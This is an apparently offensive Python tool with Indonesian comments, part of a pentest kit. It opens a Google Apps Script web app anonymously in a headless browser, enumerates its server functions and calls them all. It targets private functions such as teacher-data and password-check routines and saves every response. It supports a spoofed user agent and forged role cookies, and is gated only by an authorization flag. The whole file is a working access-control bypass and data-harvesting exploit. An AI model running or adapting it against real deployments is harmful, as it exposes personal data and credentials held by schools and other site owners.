#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""api_probe.py — eksekusi `google.script.run` via headless browser (bypass terbesar).

Server Apps Script sering nyimpen fungsi privat (getDataGuru, cekPassword, getGuru)
yang TIDAK dipanggil dari UI — tapi tetap bisa dipanggil siapa pun dari console.
Script ini buka deployment URL sebagai user anon, lalu enumerate + panggil tiap fungsi
dari sisi klien (setara DevTools console), simpan semua response.

    # wajib (sekali di BlackArch):
    #   pip install playwright && playwright install chromium
    python3 api_probe.py --url https://script.google.com/macros/s/XXX/exec --out api_out
    python3 api_probe.py --url ... --cookie "role=guru1" --fns getDataGuru,cariSiswa
    python3 api_probe.py --url ... --args '["kelas9"]' --dry-fns   # cuma enumerate

Keluaran: api_surface.json (semua response) + functions.txt (daftar fungsi).
Scope-gated: modul AKTIF → butuh --authorized atau host di scope.txt.
"""
from __future__ import annotations

import argparse
import json
import pathlib
import re
import sys

sys.path.insert(0, str(pathlib.Path(__file__).parent))
from kit_common import outdir, save_json, scope_check, summary  # noqa: E402

# JS yang dievaluasi di halaman target: kumpulkan nama fungsi dari google.script.run
# (Proxy-based, semua pemanggilan .namaFungsi() terekam) + source halaman.
JS_ENUM = r"""
() => {
  const found = new Set();
  const run = window.google && google.script && google.script.run;
  // 1) sumber otoritatif: milik google.script.run sendiri
  if (run) {
    for (const k of Object.getOwnPropertyNames(run)) {
      if (typeof run[k] === 'function' && !k.startsWith('__')) found.add(k);
    }
  }
  // 2) dari source halaman: hanya google.script.run.<nama> (sinyal pasti)
  const html = document.documentElement.outerHTML;
  for (const m of html.matchAll(/google\.script\.run\s*\.\s*([A-Za-z_]\w*)/g)) {
    found.add(m[1]);
  }
  return [...found].filter(n => !['then','catch','withSuccessHandler','withFailureHandler',
    'withUserObject','setTimeout','length','name','prototype','constructor'].includes(n));
}
"""

JS_CALL = r"""
async ([fn, args]) => {
  const run = google.script.run;
  return await new Promise((resolve) => {
    let r = run
      .withSuccessHandler(s => resolve({ok: true, data: s}))
      .withFailureHandler(e => resolve({ok: false, error: String(e && e.message || e)}));
    try { r[fn].apply(r, args); }
    catch (e) { resolve({ok: false, error: 'throw: ' + String(e)}); }
    setTimeout(() => resolve({ok: false, error: 'timeout 30s'}), 30000);
  });
}
"""


def main() -> int:
    ap = argparse.ArgumentParser(description="enumerate + panggil google.script.run")
    ap.add_argument("--url", required=True, help="deployment URL …/exec")
    ap.add_argument("--cookie", default="", help="Cookie header (opsional identitas)")
    ap.add_argument("--fns", default="", help="fungsi spesifik dipisah koma")
    ap.add_argument("--args", default="[]", help='args JSON array utk SEMUA fungsi')
    ap.add_argument("--dry-fns", action="store_true", help="enumerate saja, jangan panggil")
    ap.add_argument("--out", default="api_probe")
    ap.add_argument("--timeout", type=float, default=60.0)
    ap.add_argument("--authorized", action="store_true")
    ap.add_argument("--scope", default=None)
    a = ap.parse_args()

    kw = {"authorized": a.authorized}
    if a.scope:
        kw["scope_path"] = a.scope
    scope_check(a.url, **kw)

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        sys.exit("[STOP] playwright belum ada. Di BlackArch jalankan:\n"
                 "  pip install playwright && playwright install chromium")

    args_list = json.loads(a.args)
    if not isinstance(args_list, list):
        sys.exit("[STOP] --args harus JSON array, mis. '[\"kelas9\"]' (per-fungsi pakai "
                 "bentuk nested: '[[\"a\"],[\"b\"]])' — sederhana: satu args utk semua")

    d = outdir("api", a.out)
    print(f"[→] buka {a.url} (headless, tanpa Tor…)")
    with sync_playwright() as p:
        br = p.chromium.launch(headless=True)
        ctx = br.new_context(user_agent=(
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/126.0 Safari/537.36"))
        if a.cookie:
            pairs = []
            for part in a.cookie.split(";"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    pairs.append({"name": k.strip(), "value": v.strip(),
                                  "domain": urllib_domain(a.url), "path": "/"})
            if pairs:
                ctx.add_cookies(pairs)
        page = ctx.new_page()
        page.goto(a.url, timeout=int(a.timeout * 1000), wait_until="networkidle")
        page.wait_for_timeout(3000)  # biarkan Apps Script runtime init

        fns = page.evaluate(JS_ENUM) or []
        # filter: bukan properti DOM/browser yang ke-detect false positive
        fns = sorted(set(fns))
        print(f"[✓] {len(fns)} fungsi terdeteksi: {', '.join(fns) or '(kosong)'}")
        (d / "functions.txt").write_text("\n".join(fns) + "\n")

        results = []
        if a.fns:
            fns = [x.strip() for x in a.fns.split(",") if x.strip()]
        if not a.dry_fns:
            for fn in fns:
                if not re.match(r"^[A-Za-z_]\w*$", fn):
                    continue
                print(f"    → {fn}({json.dumps(args_list)}) …", end=" ", flush=True)
                try:
                    res = page.evaluate(JS_CALL, [fn, args_list])
                except Exception as e:
                    res = {"ok": False, "error": f"evaluate: {e}"}
                results.append({"fn": fn, "args": args_list, **res})
                blob = json.dumps(res, ensure_ascii=False, default=str)
                print(f"{'[✓] ' if res.get('ok') else '[✗] '}{blob[:140]}")
                if res.get("ok") and res.get("data") is not None:
                    (d / f"resp_{fn}.json").write_text(
                        json.dumps(res["data"], indent=2, ensure_ascii=False, default=str))
        page.screenshot(path=str(d / "page.png"), full_page=True)
        (d / "page.html").write_text(page.content())
        ctx.close()
        br.close()

    save_json(d / "api_surface.json", {"url": a.url, "functions": fns,
                                       "calls": results})
    summary("api probe",
            [("fungsi ditemukan", len(fns)),
             ("dipanggil", len(results)),
             ("sukses", sum(1 for r in results if r.get("ok")))])
    print(f"[✓] {d}")
    return 0


def urllib_domain(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).netloc.split(":")[0]


if __name__ == "__main__":
    sys.exit(main())
